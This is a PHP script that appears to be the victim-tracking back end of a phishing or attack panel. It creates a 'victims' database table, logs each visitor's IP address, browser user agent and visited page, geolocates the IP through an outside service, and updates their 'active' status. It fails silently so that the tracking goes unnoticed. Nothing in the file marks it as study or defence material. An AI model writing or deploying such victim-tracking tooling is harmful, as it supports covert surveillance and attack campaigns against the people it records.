<?php
require_once 'config/database.php';

// Set fast headers
header('Content-Type: text/plain');
header('Cache-Control: no-cache');

try {
    $database = new Database();
    $db = $database->getConnection();
    
    // Create victims table if not exists
    $db->exec("CREATE TABLE IF NOT EXISTS victims (
        id SERIAL PRIMARY KEY,
        ip_address VARCHAR(45) NOT NULL,
        user_agent TEXT,
        country VARCHAR(100),
        isp VARCHAR(200),
        last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        status VARCHAR(20) DEFAULT 'active',
        page_visited VARCHAR(255),
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )");
    
    // Get visitor info
    $ip = $_GET['ip'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $page = $_GET['page'] ?? 'unknown';
    $action = $_GET['action'] ?? 'visit';
    
    // Enhanced IP info
    $country = 'Unknown';
    $isp = 'Unknown';
    
    // Try to get better IP info
    if ($ip !== 'unknown' && $ip !== '127.0.0.1') {
        $ip_info = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}"), true);
        if ($ip_info && $ip_info['status'] === 'success') {
            $country = $ip_info['country'] ?? 'Unknown';
            $isp = $ip_info['isp'] ?? 'Unknown';
        }
    }
    
    // Check if victim exists
    $check_query = "SELECT id FROM victims WHERE ip_address = :ip";
    $check_stmt = $db->prepare($check_query);
    $check_stmt->execute([':ip' => $ip]);
    $existing_victim = $check_stmt->fetch(PDO::FETCH_ASSOC);
    
    if ($existing_victim) {
        // Update activity - ALWAYS update timestamp
        $update_query = "UPDATE victims SET last_activity = NOW(), page_visited = :page, status = 'active' WHERE ip_address = :ip";
        $update_stmt = $db->prepare($update_query);
        $update_stmt->execute([':page' => $page, ':ip' => $ip]);
    } else {
        // Insert new victim
        $insert_query = "INSERT INTO victims (ip_address, user_agent, country, isp, page_visited) 
                        VALUES (:ip, :user_agent, :country, :isp, :page)";
        $insert_stmt = $db->prepare($insert_query);
        $insert_stmt->execute([
            ':ip' => $ip,
            ':user_agent' => $user_agent,
            ':country' => $country,
            ':isp' => $isp,
            ':page' => $page
        ]);
    }
    
    echo "TRACKED";
    
} catch (Exception $e) {
    // Silent fail - don't break anything
    echo "OK";
}